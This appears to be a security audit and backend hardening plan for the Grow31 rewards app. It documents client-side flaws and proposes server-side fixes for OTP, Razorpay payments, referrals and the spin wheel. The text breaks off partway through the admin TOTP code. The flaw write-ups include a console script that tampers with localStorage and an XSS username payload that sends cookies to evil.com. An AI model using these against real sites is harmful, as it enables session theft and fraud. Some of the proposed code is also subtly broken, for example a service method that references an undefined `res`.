# 🔐 GROW31 — COMPLETE SECURITY MASTER PLAN
### Deep Code Analysis + Backend Architecture + VPS Hardening
*Every vulnerability found. Every fix explained. Production-ready.*

---

## 📋 TABLE OF CONTENTS
1. [Current Codebase Vulnerabilities — Deep Analysis](#1-vulnerabilities)
2. [Backend Architecture Plan](#2-backend)
3. [Authentication & OTP System](#3-auth)
4. [Payment Integration (Razorpay)](#4-payment)
5. [Task Verification System (Medium→Hard, Cheat-Proof)](#5-tasks)
6. [Referral System — Anti-Fraud](#6-referral)
7. [Spin Wheel — Server-Side Outcome](#7-spin)
8. [Admin Panel — Secured](#8-admin)
9. [Database Schema (PostgreSQL)](#9-database)
10. [API Security Layer](#10-api-security)
11. [Hostinger VPS Hardening](#11-vps)
12. [Complete Backend File Structure](#12-structure)

---

## 1. CURRENT CODEBASE VULNERABILITIES — DEEP ANALYSIS

### 🚨 CRITICAL — Users Can Steal Without Paying

#### VULN-01: Everything Stored in localStorage
```javascript
// YOUR CODE (app.js line 60-61)
const DB = {
  get(k, d) { const v = localStorage.getItem('g31_' + k); return v ? JSON.parse(v) : d },
  set(k, v) { localStorage.setItem('g31_' + k, JSON.stringify(v)) }
};
```
**EXPLOIT:** Any user opens Chrome DevTools → Console → types:
```javascript
// HACKER DOES THIS IN 10 SECONDS:
let u = JSON.parse(localStorage.getItem('g31_users'));
let phone = Object.keys(u)[0];
u[phone].coins = 999999;
u[phone].hasPaid = true;
u[phone].tier = 31;
u[phone].referrals = 500;
localStorage.setItem('g31_users', JSON.stringify(u));
location.reload();
// DONE — They now have Tier 31, 999999 coins, 500 referrals. FOR FREE.
```
**FIX:** All data MUST live in backend database. Frontend only shows what server sends.

---

#### VULN-02: Fake OTP — No Real Verification
```javascript
// YOUR CODE (app.js line 974-989)
function sendOTP() {
  tempPhone = document.getElementById('phoneInput')?.value?.trim() || '';
  if (tempPhone.length < 10 || !/^\d+$/.test(tempPhone)) return showToast("Enter valid 10-digit number", "error");
  proceedWithOTP(); // ← JUST SHOWS THE OTP SCREEN, SENDS NOTHING
}

function verifyOTP() {
  const otp = otpInput?.value?.trim() || '';
  if (otp.length !== 6 || !/^\d+$/.test(otp)) return showToast("Enter valid 6-digit OTP", "error");
  // ← ACCEPTS ANY 6-DIGIT NUMBER. 123456, 000000, 111111 — ALL WORK
```
**EXPLOIT:** Enter phone `9999999999`, enter OTP `123456` → logged in as ANY phone number. Someone can fake someone else's identity.

---

#### VULN-03: Payment is 100% Simulated — No Money Taken
```javascript
// YOUR CODE (app.js line 1233-1244)
function processPayment() {
  // ...
  showToast('Demo payment processing...', 'success'); // ← JUST A TOAST
  setTimeout(() => {
    showView('confirmView');
    simulateConfirm(); // ← FAKE CONFIRMATION
  }, 800);
}

// YOUR CODE (app.js line 1294-1318)
function afterPayment() {
  // ...
  u.hasPaid = true;     // ← JUST SETS A FLAG IN LOCALSTORAGE
  u.tiersOwned = ...    // ← ALL FAKE, ALL IN BROWSER
  saveData();           // ← SAVES TO LOCALSTORAGE
}
```
**EXPLOIT:** Users get full access without ever paying. `hasPaid = true` is set by client code.

---

#### VULN-04: Admin Panel Has Zero Authentication
```javascript
// YOUR CODE (app.js line 2962-2964)
function adminShortcut() { showView('adminView') } // ← NO PASSWORD. NONE.
function exitAdmin() { if (state.currentUser) loginSuccess(); }
```
**EXPLOIT:** ANY user opens console, types `adminShortcut()` → they're in the admin panel. They can verify their own payouts, add rewards, see all user phone numbers.

---

#### VULN-05: Spin Wheel Outcome is Determined by the Browser
```javascript
// YOUR CODE (app.js line 1919-1991)
function doSpin(type) {
  // ...
  const totalRotation = (Math.random() * Math.PI * 2) + (Math.PI * 2 * 8); // ← CLIENT MATH
  // ...
  // Prize calculated from final angle in browser
  const prizeIndex = Math.floor(normalizedAngle / sliceAngle) % prizes.length;
  const prize = prizes[prizeIndex]; // ← CLIENT PICKS THE PRIZE
  u.coins += prize.coins;           // ← CLIENT ADDS COINS TO ITSELF
}
```
**EXPLOIT:** User pauses execution, modifies `prize.coins = 999999` in debugger. Or replaces `Math.random` to always return max prize angle.

---

#### VULN-06: Task Completion Has No Verification
```javascript
// YOUR CODE (app.js line 1570-1578)
function completeTask(tid) {
  const task = state.currentUser.tasks.find(x => x.id === tid);
  if (!task || task.done) return;
  task.done = true; // ← NO PROOF REQUIRED
  state.currentUser.coins += task.reward; // ← SELF-AWARDED
  saveData(); // ← SAVED TO LOCALSTORAGE
}
```
**EXPLOIT:** Call `completeTask(3100)` in console for any task on any day. Even tasks for Day 31 when user just joined on Day 1. All 155 tasks completable in 5 minutes.

---

#### VULN-07: Referral System — Self-Referral and Coin Farming
```javascript
// YOUR CODE (app.js line 1093-1108)
if (inviteCode) {
  Object.values(state.allUsers).forEach(u => {
    if (u.refCode === inviteCode) {
      // Awards coins to referrer — ALL CLIENT SIDE
      u.coins += refCoins;
      newUser.coins += 50;
    }
  });
}
```
**EXPLOIT 1:** Create account A, copy referral code. Open incognito window, create account B using A's code → A gets +50 coins free. Repeat 100 times = 5000 free coins.
**EXPLOIT 2:** Directly modify localStorage to add fake referrals to your account.
**EXPLOIT 3:** One phone number = one user per device, but no global uniqueness check across devices.

---

#### VULN-08: Daily Check-In and Ad Watch Bypass
```javascript
// YOUR CODE (app.js line 2105-2115)
function watchAdForSpin() {
  const today = new Date().toDateString(); // ← CLIENT DATE
  if (u.lastAdDate !== today) { u.adsWatchedToday = 0; } // ← RESET IN BROWSER
  u.spinTickets = (u.spinTickets || 0) + 1; // ← SELF-AWARDED
  saveData();
}
```
**EXPLOIT:** Set `localStorage.setItem('g31_users', ...)` with `adsWatchedToday: 0` → unlimited spin tickets.

---

#### VULN-09: XSS in Admin Panel (username not escaped)
```javascript
// YOUR CODE (app.js line 2587-2597)
c.innerHTML += `
  <div class="admin-user-card">
    <div><b style="...">${u.username}</b>    // ← UNESCAPED USER INPUT IN innerHTML
    <small class="text-muted">${u.phone}</small>  // ← SAME
    <small>${u.refCode || '—'}</small>
```
**EXPLOIT:** User registers with username `<img src=x onerror="fetch('https://evil.com/?token='+document.cookie)">` → when admin views the panel, their session gets stolen.

---

#### VULN-10: All Other Users' Phone Numbers Are Exposed
```javascript
// YOUR CODE (app.js line 95-97)
allUsers: DB.get('users', {}), // ← ALL USERS IN LOCALSTORAGE
```
Every registered user on the SAME device can see every other user's phone number, coins, tier, referral list, and transaction history in localStorage. This is a GDPR/privacy violation.

---

#### VULN-11: Quiz Answers Are in the Client Bundle
```javascript
// YOUR CODE (app.js line 3280)
{ q: "If you score 10/10...", opts: ["10", "20", "30", "50"], ans: 2, // ← ANSWER INDEX EXPOSED
```
Users get 100% on every quiz just by reading the source.

---

#### VULN-12: `resetAllData()` is Publicly Callable
```javascript
// YOUR CODE (app.js line 2958-2959)
function resetAllData() {
  if (confirm("Delete everything?")) { localStorage.clear(); location.reload(); }
}
```
If another user has access to someone's device/session, they can wipe data. Or an attacker can inject this via XSS.

---

## 2. BACKEND ARCHITECTURE PLAN

### Tech Stack
```
┌─────────────────────────────────────────────────┐
│  FRONTEND (Your existing HTML/CSS/JS)            │
│  → Fetch API calls to backend                    │
└─────────────┬───────────────────────────────────┘
              │ HTTPS (SSL via Let's Encrypt)
┌─────────────▼───────────────────────────────────┐
│  NGINX (Reverse Proxy + Rate Limiter + WAF)      │
│  Port 80/443 → forwards to Node.js on 3000       │
└─────────────┬───────────────────────────────────┘
              │
┌─────────────▼───────────────────────────────────┐
│  NODE.JS + EXPRESS BACKEND                       │
│  • JWT Authentication                            │
│  • Input Validation (Zod/Joi)                    │
│  • Rate Limiting (express-rate-limit)            │
│  • Helmet.js (Security Headers)                  │
│  • CORS (whitelist only)                         │
└─────────────┬───────────────────────────────────┘
              │
┌─────────────▼──────────────┐  ┌──────────────────┐
│  PostgreSQL Database        │  │  Redis Cache      │
│  (All user data, coins,     │  │  (OTP store,      │
│  tasks, payments, tiers)    │  │  sessions,        │
└────────────────────────────┘  │  rate limits,     │
                                 │  spin locks)      │
                                 └──────────────────┘
```

### Node.js Package List
```json
{
  "dependencies": {
    "express": "^4.18.2",
    "pg": "^8.11.3",
    "ioredis": "^5.3.2",
    "jsonwebtoken": "^9.0.2",
    "bcryptjs": "^2.4.3",
    "helmet": "^7.1.0",
    "express-rate-limit": "^7.1.5",
    "rate-limit-redis": "^4.2.0",
    "zod": "^3.22.4",
    "razorpay": "^2.9.2",
    "axios": "^1.6.2",
    "express-validator": "^7.0.1",
    "uuid": "^9.0.0",
    "dotenv": "^16.3.1",
    "cors": "^2.8.5",
    "morgan": "^1.10.0",
    "winston": "^3.11.0",
    "multer": "^1.4.5",
    "sharp": "^0.33.1",
    "crypto": "built-in"
  }
}
```

---

## 3. AUTHENTICATION & OTP SYSTEM

### Real OTP with MSG91 (India — Best for ₹ rates)

```javascript
// backend/services/otpService.js

const axios = require('axios');
const redis = require('../config/redis');
const crypto = require('crypto');

const OTP_EXPIRY_SECONDS = 300;   // 5 minutes
const MAX_OTP_ATTEMPTS = 3;       // 3 wrong attempts = lock
const RESEND_COOLDOWN = 60;       // 60 seconds before resend
const MAX_OTP_PER_PHONE_PER_DAY = 5; // Prevent SMS bombing

class OTPService {
  
  // Generate cryptographically secure OTP
  static generateOTP() {
    return crypto.randomInt(100000, 999999).toString();
  }

  static async sendOTP(phone) {
    const cleanPhone = phone.replace(/\D/g, '');
    if (cleanPhone.length !== 10) throw new Error('Invalid phone number');

    // Rate limit: max 5 OTPs per phone per day
    const dailyKey = `otp:daily:${cleanPhone}:${new Date().toDateString()}`;
    const dailyCount = await redis.incr(dailyKey);
    await redis.expire(dailyKey, 86400);
    if (dailyCount > MAX_OTP_PER_PHONE_PER_DAY) {
      throw new Error('TOO_MANY_OTP_REQUESTS');
    }

    // Enforce resend cooldown
    const cooldownKey = `otp:cooldown:${cleanPhone}`;
    const inCooldown = await redis.get(cooldownKey);
    if (inCooldown) throw new Error('OTP_COOLDOWN_ACTIVE');

    const otp = this.generateOTP();
    // Store hashed OTP (never store plaintext OTP)
    const hashedOTP = crypto.createHash('sha256').update(otp + cleanPhone).digest('hex');
    
    await redis.setex(`otp:${cleanPhone}`, OTP_EXPIRY_SECONDS, JSON.stringify({
      hash: hashedOTP,
      attempts: 0,
      createdAt: Date.now()
    }));
    await redis.setex(cooldownKey, RESEND_COOLDOWN, '1');

    // Send via MSG91 (₹0.18/SMS in India)
    const response = await axios.post('https://api.msg91.com/api/v5/otp', {
      template_id: process.env.MSG91_TEMPLATE_ID,
      mobile: `91${cleanPhone}`,
      authkey: process.env.MSG91_AUTH_KEY,
      otp: otp
    });

    if (response.data.type !== 'success') throw new Error('SMS_SEND_FAILED');
    return { sent: true, expiresIn: OTP_EXPIRY_SECONDS };
  }

  static async verifyOTP(phone, otp) {
    const cleanPhone = phone.replace(/\D/g, '');
    const stored = await redis.get(`otp:${cleanPhone}`);
    if (!stored) throw new Error('OTP_EXPIRED_OR_NOT_FOUND');

    const data = JSON.parse(stored);
    
    // Lock after 3 failed attempts
    if (data.attempts >= MAX_OTP_ATTEMPTS) {
      await redis.del(`otp:${cleanPhone}`);
      throw new Error('OTP_MAX_ATTEMPTS_EXCEEDED');
    }

    const inputHash = crypto.createHash('sha256').update(otp + cleanPhone).digest('hex');
    if (inputHash !== data.hash) {
      data.attempts++;
      await redis.setex(`otp:${cleanPhone}`, OTP_EXPIRY_SECONDS, JSON.stringify(data));
      throw new Error('OTP_INVALID');
    }

    // OTP correct — delete it (one-time use)
    await redis.del(`otp:${cleanPhone}`);
    return true;
  }
}

module.exports = OTPService;
```

### JWT Authentication (Dual Token System)
```javascript
// backend/middleware/auth.js

const jwt = require('jsonwebtoken');
const redis = require('../config/redis');

const ACCESS_TOKEN_EXPIRY = '15m';    // Short-lived access token
const REFRESH_TOKEN_EXPIRY = '30d';   // Long-lived refresh token

class AuthService {

  static generateTokens(userId, phone) {
    const accessToken = jwt.sign(
      { userId, phone, type: 'access' },
      process.env.JWT_ACCESS_SECRET,
      { expiresIn: ACCESS_TOKEN_EXPIRY }
    );

    const refreshToken = jwt.sign(
      { userId, phone, type: 'refresh' },
      process.env.JWT_REFRESH_SECRET,
      { expiresIn: REFRESH_TOKEN_EXPIRY }
    );

    return { accessToken, refreshToken };
  }

  static async storeRefreshToken(userId, refreshToken) {
    // Store in Redis, hashed, linked to userId
    const hash = crypto.createHash('sha256').update(refreshToken).digest('hex');
    await redis.setex(`refresh:${userId}:${hash}`, 30 * 24 * 3600, '1');
  }

  static async revokeAllUserTokens(userId) {
    // On logout or security breach — invalidate all sessions
    const keys = await redis.keys(`refresh:${userId}:*`);
    if (keys.length) await redis.del(...keys);
  }

  // Middleware: Verify access token on every protected route
  static requireAuth(req, res, next) {
    const authHeader = req.headers.authorization;
    if (!authHeader?.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'NO_TOKEN' });
    }

    try {
      const token = authHeader.split(' ')[1];
      const decoded = jwt.verify(token, process.env.JWT_ACCESS_SECRET);
      if (decoded.type !== 'access') throw new Error('WRONG_TOKEN_TYPE');
      req.userId = decoded.userId;
      req.userPhone = decoded.phone;
      next();
    } catch (e) {
      if (e.name === 'TokenExpiredError') {
        return res.status(401).json({ error: 'TOKEN_EXPIRED' });
      }
      return res.status(401).json({ error: 'INVALID_TOKEN' });
    }
  }

  // Admin middleware — separate secret, TOTP required
  static requireAdmin(req, res, next) {
    const adminToken = req.headers['x-admin-token'];
    if (!adminToken) return res.status(403).json({ error: 'FORBIDDEN' });

    try {
      const decoded = jwt.verify(adminToken, process.env.JWT_ADMIN_SECRET);
      if (!decoded.isAdmin) throw new Error('NOT_ADMIN');
      req.adminId = decoded.adminId;
      next();
    } catch {
      return res.status(403).json({ error: 'FORBIDDEN' });
    }
  }
}
```

---

## 4. PAYMENT INTEGRATION (RAZORPAY — REAL MONEY)

```javascript
// backend/services/paymentService.js

const Razorpay = require('razorpay');
const crypto = require('crypto');
const db = require('../config/db');

const razorpay = new Razorpay({
  key_id: process.env.RAZORPAY_KEY_ID,
  key_secret: process.env.RAZORPAY_KEY_SECRET
});

class PaymentService {

  // Step 1: Frontend requests an order
  static async createOrder(userId, tierQty) {
    // Get user to determine tier price
    const user = await db.query('SELECT * FROM users WHERE id = $1', [userId]);
    if (!user.rows[0]) throw new Error('USER_NOT_FOUND');

    const tierPrice = this.calculateTierPrice(user.rows[0].tier_num, tierQty);
    const amountPaise = tierPrice * 100; // Razorpay uses paise (₹1 = 100 paise)

    const order = await razorpay.orders.create({
      amount: amountPaise,
      currency: 'INR',
      receipt: `grow31_${userId}_${Date.now()}`,
      notes: { userId, tierQty }
    });

    // Store pending payment in DB
    await db.query(`
      INSERT INTO payments (user_id, razorpay_order_id, amount, qty, status)
      VALUES ($1, $2, $3, $4, 'pending')
    `, [userId, order.id, tierPrice, tierQty]);

    return {
      orderId: order.id,
      amount: amountPaise,
      currency: 'INR',
      key: process.env.RAZORPAY_KEY_ID
    };
  }

  // Step 2: After Razorpay payment, verify signature (CRITICAL)
  static async verifyPayment(orderId, paymentId, signature, userId) {
    // Verify Razorpay signature — this is the ONLY way to confirm payment
    const body = orderId + '|' + paymentId;
    const expectedSignature = crypto
      .createHmac('sha256', process.env.RAZORPAY_KEY_SECRET)
      .update(body)
      .digest('hex');

    if (expectedSignature !== signature) {
      // Log attempted fraud
      await db.query(`
        INSERT INTO security_logs (user_id, event, details)
        VALUES ($1, 'PAYMENT_SIGNATURE_MISMATCH', $2)
      `, [userId, JSON.stringify({ orderId, paymentId })]);
      throw new Error('PAYMENT_SIGNATURE_INVALID');
    }

    // Signature valid — update payment status in DB
    const payment = await db.query(`
      UPDATE payments SET status = 'verified', razorpay_payment_id = $1, verified_at = NOW()
      WHERE razorpay_order_id = $2 AND user_id = $3 AND status = 'pending'
      RETURNING *
    `, [paymentId, orderId, userId]);

    if (!payment.rows[0]) throw new Error('PAYMENT_RECORD_NOT_FOUND');

    // Update user tier — ONLY AFTER VERIFIED PAYMENT
    await this.activateUserTier(userId, payment.rows[0].qty, payment.rows[0].amount);

    return { success: true };
  }

  // Step 3: Razorpay Webhook (server-to-server verification — most secure)
  static async handleWebhook(rawBody, signature) {
    const expectedSignature = crypto
      .createHmac('sha256', process.env.RAZORPAY_WEBHOOK_SECRET)
      .update(rawBody)
      .digest('hex');

    if (expectedSignature !== signature) throw new Error('INVALID_WEBHOOK_SIGNATURE');

    const event = JSON.parse(rawBody);
    if (event.event === 'payment.captured') {
      const { order_id, id: payment_id } = event.payload.payment.entity;
      // Double-check and activate if not already done
      await this.ensurePaymentActivated(order_id, payment_id);
    }
  }

  static async activateUserTier(userId, qty, amountPaid) {
    await db.query(`
      UPDATE users
      SET has_paid = true,
          tiers_owned = tiers_owned + $1,
          investment = investment + $2,
          tier_num = LEAST(tier_num + $1, 31),
          updated_at = NOW()
      WHERE id = $3
    `, [qty, amountPaid, userId]);
  }

  static calculateTierPrice(currentTier, qty) {
    // Tier pricing: Tier N costs ₹N
    let total = 0;
    for (let i = 0; i < qty; i++) {
      total += Math.min(currentTier + i, 31);
    }
    return total;
  }
}

module.exports = PaymentService;
```

---

## 5. TASK VERIFICATION SYSTEM (MEDIUM → HARD, CHEAT-PROOF)

### Task Verification Architecture

```
EASY TASKS      → Self-report (server records with timestamp)
MEDIUM TASKS    → Timed window + quiz question about the task
HARD TASKS      → Photo/Screenshot proof OR activity API
AUTO TASKS      → Server-side verification (referrals, streak, quiz score)
```

### Task Completion API (Server-Side)

```javascript
// backend/routes/tasks.js

const { requireAuth } = require('../middleware/auth');
const redis = require('../config/redis');
const db = require('../config/db');

// POST /api/tasks/complete
router.post('/complete', requireAuth, async (req, res) => {
  const { taskKey, day, proofType, proofData } = req.body;
  const userId = req.userId;

  // 1. Verify task exists and belongs to this day
  const task = TASK_BANK.find(t => t.key === taskKey);
  if (!task) return res.status(400).json({ error: 'INVALID_TASK' });

  // 2. Check user's actual current day (server-authoritative)
  const user = await db.query(
    'SELECT * FROM users WHERE id = $1 AND has_paid = true', [userId]
  );
  if (!user.rows[0]) return res.status(403).json({ error: 'NOT_PAID' });

  const u = user.rows[0];
  const userDay = u.current_day;

  // 3. Prevent completing tasks from future days
  if (day > userDay) {
    return res.status(400).json({ error: 'TASK_NOT_UNLOCKED_YET' });
  }

  // 4. Check if already completed today (idempotency)
  const alreadyDone = await db.query(`
    SELECT id FROM task_completions
    WHERE user_id = $1 AND task_key = $2 AND day = $3
  `, [userId, taskKey, day]);

  if (alreadyDone.rows.length > 0) {
    return res.status(409).json({ error: 'TASK_ALREADY_COMPLETED' });
  }

  // 5. Verify based on difficulty
  let verified = false;
  let verificationDetails = {};

  if (task.verificationMethod === 'self_report') {
    // Self-report: Accept but flag for anomaly detection
    verified = true;
    await this.flagForAnomalyCheck(userId, taskKey, day);

  } else if (task.verificationMethod === 'timed') {
    // Task requires user to have been on the task screen for N seconds
    const timerKey = `task:timer:${userId}:${taskKey}:${day}`;
    const timerStart = await redis.get(timerKey);
    if (!timerStart) return res.status(400).json({ error: 'TASK_TIMER_NOT_STARTED' });
    const elapsed = (Date.now() - parseInt(timerStart)) / 1000;
    const requiredSeconds = task.minSeconds || 60;
    if (elapsed < requiredSeconds) {
      return res.status(400).json({ error: 'TASK_TIME_INCOMPLETE', required: requiredSeconds, elapsed });
    }
    verified = true;

  } else if (task.verificationMethod === 'screenshot_upload') {
    // Screenshot required — verify image was uploaded this session
    const uploadKey = `task:upload:${userId}:${taskKey}:${day}`;
    const uploadedUrl = await redis.get(uploadKey);
    if (!uploadedUrl) return res.status(400).json({ error: 'PROOF_REQUIRED' });
    verified = true;
    verificationDetails = { screenshotUrl: uploadedUrl };

  } else if (task.verificationMethod === 'quiz_pass') {
    // Requires passing today's quiz with 8+/10 score
    const quizScore = await db.query(`
      SELECT score FROM quiz_attempts
      WHERE user_id = $1 AND quiz_day = $2 AND score >= 8
      AND created_at > NOW() - INTERVAL '24 hours'
    `, [userId, day]);
    if (!quizScore.rows.length) return res.status(400).json({ error: 'QUIZ_NOT_PASSED' });
    verified = true;

  } else if (task.verificationMethod === 'auto') {
    // Automatically handled — these tasks are completed by other systems
    // (streak counter, referral system, etc.)
    verified = true;
  }

  if (!verified) return res.status(400).json({ error: 'VERIFICATION_FAILED' });

  // 6. Award coins in database (NOT in frontend)
  const reward = TASK_DIFFICULTY[task.difficulty].reward;

  await db.query('BEGIN');
  try {
    await db.query(`
      INSERT INTO task_completions (user_id, task_key, day, reward, verification_method, verification_details, completed_at)
      VALUES ($1, $2, $3, $4, $5, $6, NOW())
    `, [userId, taskKey, day, reward, task.verificationMethod, JSON.stringify(verificationDetails)]);

    await db.query(`
      UPDATE users SET coins = coins + $1, updated_at = NOW() WHERE id = $2
    `, [reward, userId]);

    await db.query(`
      INSERT INTO coin_transactions (user_id, amount, type, description)
      VALUES ($1, $2, 'task', $3)
    `, [userId, reward, `Task: ${task.title} (Day ${day})`]);

    // Check for all-tasks-done bonus
    const todayTasks = getDailyTasksForDay(day);
    const completedToday = await db.query(`
      SELECT COUNT(*) FROM task_completions WHERE user_id = $1 AND day = $2
    `, [userId, day]);

    if (parseInt(completedToday.rows[0].count) + 1 >= todayTasks.length) {
      const bonus = 30;
      await db.query('UPDATE users SET coins = coins + $1 WHERE id = $2', [bonus, userId]);
      await db.query(`
        INSERT INTO coin_transactions (user_id, amount, type, description)
        VALUES ($1, $2, 'bonus', 'All tasks completed bonus')
      `, [userId, bonus]);
    }

    await db.query('COMMIT');
  } catch (e) {
    await db.query('ROLLBACK');
    throw e;
  }

  return res.json({ success: true, coinsAwarded: reward });
});
```

### Medium-to-Hard Task Verification Table

| Task | Difficulty | Verification Method | How You Catch Cheaters |
|------|-----------|--------------------|-----------------------|
| Morning Walk 20 mins | Easy | Self-report + anomaly flag | ML model: detects users who complete ALL tasks in <30 seconds |
| Run 5km | Hard | **Timed screen** (must stay on task screen 5+ min) OR upload health app screenshot | Server checks timer. Screenshot is stored and admin can spot-check |
| No Social Media 2h | Hard | **Quiz about what you did instead** (text input reviewed) | NLP scan for copy-paste answers |
| Deep Work 90 min | Hard | **Screenshot of work product** (mandatory upload) | Hash comparison — detects same image submitted by multiple users |
| Share on Story | Medium | Screenshot upload → verified | AI/admin verifies Grow31 tag is visible |
| Invite Friend | Hard | **Auto** — referral system counts real referrals | Server counts actual paid referrals only |
| Score 8/10 Quiz | Hard | **Auto** — quiz is server-side, answers not in frontend | Quiz questions and answers stored ONLY in DB |
| Check-in 3 Days | Medium | **Auto** — server-side streak counter | Timestamps validated server-side |
| Spin Win 10+ | Medium | **Auto** — spin outcome generated server-side | Server picks outcome, not browser |

---

## 6. REFERRAL SYSTEM — ANTI-FRAUD

```javascript
// backend/services/referralService.js

class ReferralService {

  static async applyReferral(newUserId, newUserPhone, referralCode) {
    // 1. Validate code format
    if (!referralCode.match(/^Grow31\/[A-Za-z0-9]+-\d{4}$/)) {
      throw new Error('INVALID_REFERRAL_FORMAT');
    }

    // 2. Find referrer in DB
    const referrer = await db.query(
      'SELECT * FROM users WHERE ref_code = $1 AND has_paid = true', [referralCode]
    );
    if (!referrer.rows[0]) throw new Error('REFERRAL_CODE_NOT_FOUND');

    const referrerId = referrer.rows[0].id;

    // 3. Anti-fraud checks
    // a. Can't refer yourself
    if (referrerId === newUserId) throw new Error('SELF_REFERRAL_DETECTED');

    // b. Same device fingerprint check (stored at signup)
    const sameDevice = await db.query(`
      SELECT id FROM users WHERE device_fingerprint = 
        (SELECT device_fingerprint FROM users WHERE id = $1) 
      AND id = $2
    `, [newUserId, referrerId]);
    if (sameDevice.rows.length > 0) {
      await this.logFraud(newUserId, 'SAME_DEVICE_REFERRAL');
      throw new Error('SAME_DEVICE_REFERRAL_BLOCKED');
    }

    // c. Referrer can't be referred back by someone they referred
    const circular = await db.query(`
      SELECT id FROM referrals 
      WHERE referrer_id = $1 AND referred_id = $2
    `, [newUserId, referrerId]);
    if (circular.rows.length > 0) throw new Error('CIRCULAR_REFERRAL_BLOCKED');

    // d. IP address check — max 2 referrals from same IP
    const sameIP = await db.query(`
      SELECT COUNT(*) FROM referrals r
      JOIN users u ON r.referred_id = u.id
      WHERE r.referrer_id = $1
      AND u.registration_ip = (SELECT registration_ip FROM users WHERE id = $2)
    `, [referrerId, newUserId]);
    if (parseInt(sameIP.rows[0].count) >= 2) {
      await this.logFraud(newUserId, 'SAME_IP_REFERRAL_LIMIT');
      throw new Error('TOO_MANY_REFERRALS_FROM_SAME_IP');
    }

    // e. Referral only counts if referred user PAYS (not just registers)
    // Coins are NOT awarded here — they're awarded when the referred user pays

    // Store pending referral
    await db.query(`
      INSERT INTO referrals (referrer_id, referred_id, referral_code, status)
      VALUES ($1, $2, $3, 'pending')
    `, [referrerId, newUserId, referralCode]);

    return { referrerId };
  }

  // Called ONLY when referred user completes payment
  static async activateReferral(newUserId) {
    const referral = await db.query(`
      SELECT r.*, u.tier_num FROM referrals r
      JOIN users u ON r.referrer_id = u.id
      WHERE r.referred_id = $1 AND r.status = 'pending'
    `, [newUserId]);

    if (!referral.rows[0]) return; // No referral or already activated

    const ref = referral.rows[0];
    const referrerCoins = getTierCoinsPerReferral(ref.tier_num);
    const referredCoins = 50;

    await db.query('BEGIN');
    try {
      // Award referrer
      await db.query('UPDATE users SET coins = coins + $1, referral_count = referral_count + 1 WHERE id = $2', 
        [referrerCoins, ref.referrer_id]);
      await db.query(`INSERT INTO coin_transactions (user_id, amount, type, description) VALUES ($1, $2, 'referral', 'Referral bonus')`,
        [ref.referrer_id, referrerCoins]);

      // Award new user
      await db.query('UPDATE users SET coins = coins + $1 WHERE id = $2', [referredCoins, newUserId]);

      // Mark referral as active
      await db.query('UPDATE referrals SET status = $1, activated_at = NOW() WHERE id = $2',
        ['active', ref.id]);

      await db.query('COMMIT');
    } catch (e) {
      await db.query('ROLLBACK');
      throw e;
    }
  }
}
```

---

## 7. SPIN WHEEL — SERVER-SIDE OUTCOME

```javascript
// backend/services/spinService.js
// The spin outcome is DECIDED BY THE SERVER, not the browser

class SpinService {

  static PRIZES = [
    { label: '30 coins', coins: 30, weight: 1 },
    { label: '1 coin',   coins: 1,  weight: 5000 },
    { label: '10 coins', coins: 10, weight: 200 },
    { label: '0 coins',  coins: 0,  weight: 1000 },
    { label: '5 coins',  coins: 5,  weight: 400 },
    { label: '15 coins', coins: 15, weight: 80 },
    { label: '20 coins', coins: 20, weight: 40 },
    { label: '25 coins', coins: 25, weight: 10 }
  ];

  static pickPrize() {
    const totalWeight = this.PRIZES.reduce((sum, p) => sum + p.weight, 0);
    const rand = crypto.randomInt(1, totalWeight + 1);
    let cumulative = 0;
    for (const prize of this.PRIZES) {
      cumulative += prize.weight;
      if (rand <= cumulative) return prize;
    }
    return this.PRIZES[1]; // fallback to 1 coin
  }

  static async spin(userId, spinType) {
    // 1. Atomic lock — prevent double-spin
    const lockKey = `spin:lock:${userId}`;
    const locked = await redis.set(lockKey, '1', 'EX', 30, 'NX'); // 30s lock
    if (!locked) return res.status(429).json({ error: 'SPIN_IN_PROGRESS' });

    try {
      const user = await db.query('SELECT * FROM users WHERE id = $1', [userId]);
      const u = user.rows[0];

      // 2. Validate ticket/token
      if (spinType === 'ticket') {
        if (u.spin_tickets < 1) throw new Error('NO_TICKETS');
        await db.query('UPDATE users SET spin_tickets = spin_tickets - 1 WHERE id = $1', [userId]);
      } else if (spinType === 'token') {
        if (u.spin_tokens < 200) throw new Error('NOT_ENOUGH_TOKENS');
        await db.query('UPDATE users SET spin_tokens = spin_tokens - 200 WHERE id = $1', [userId]);
      }

      // 3. SERVER picks the prize (crypto-secure random)
      const prize = this.pickPrize();

      // 4. Calculate what angle the wheel should show for this prize
      // The frontend will animate to the angle the SERVER tells it
      const prizeIndex = this.PRIZES.indexOf(prize);
      const sliceAngle = (2 * Math.PI) / this.PRIZES.length;
      const targetAngle = (prizeIndex * sliceAngle) + (sliceAngle / 2);
      const fullRotations = Math.PI * 2 * (8 + Math.floor(Math.random() * 3)); // 8-10 full spins
      const finalAngle = fullRotations + targetAngle;

      // 5. Award coins in DB
      if (prize.coins > 0) {
        await db.query('UPDATE users SET coins = coins + $1 WHERE id = $2', [prize.coins, userId]);
        await db.query(`
          INSERT INTO coin_transactions (user_id, amount, type, description)
          VALUES ($1, $2, 'spin', $3)
        `, [userId, prize.coins, `Spin win: ${prize.label}`]);
      }

      // 6. Record spin
      await db.query(`
        INSERT INTO spin_records (user_id, spin_type, prize_coins, prize_label)
        VALUES ($1, $2, $3, $4)
      `, [userId, spinType, prize.coins, prize.label]);

      return {
        prize,
        finalAngle,    // Frontend animates to THIS angle — cannot cheat
        newBalance: u.coins + prize.coins
      };

    } finally {
      await redis.del(lockKey); // Always release lock
    }
  }
}
```

---

## 8. ADMIN PANEL — SECURED

```javascript
// backend/routes/admin.js
// Admin panel requires: TOTP (Google Authenticator) + separate JWT + IP whitelist

const speakeasy = require('speakeasy'); // For TOTP

class AdminAuth {

  // Admin login flow:
  // 1. POST /admin/login { adminUsername, adminPassword }
  // 2. If valid → prompt for TOTP code
  // 3. POST /admin/verify-totp { tempToken, totpCode }
  // 4. If valid → issue admin JWT (1 hour expiry)

  static async login(username, password) {
    const admin = await db.query('SELECT * FROM admins WHERE username = $1', [username]);
    if (!admin.rows[0]) throw new Error('INVALID_CREDENTIALS');

    const valid = await bcrypt.compare(password, admin.rows[0].password_hash);
    if (!valid) throw new Error('INVALID_CREDENTIALS');

    // Issue temp token for TOTP step
    const tempToken = jwt.sign(
      { adminId: admin.rows[0].id, step: 'totp' },
      process.env.JWT_ADMIN_SECRET,
      { expiresIn: '5m' }
    );

    return { tempToken };
  }

  static async verifyTOTP(tempToken, totpCode) {
    const decoded = jwt.verify(tempToken, process.env.JWT_ADMIN_SECRET);
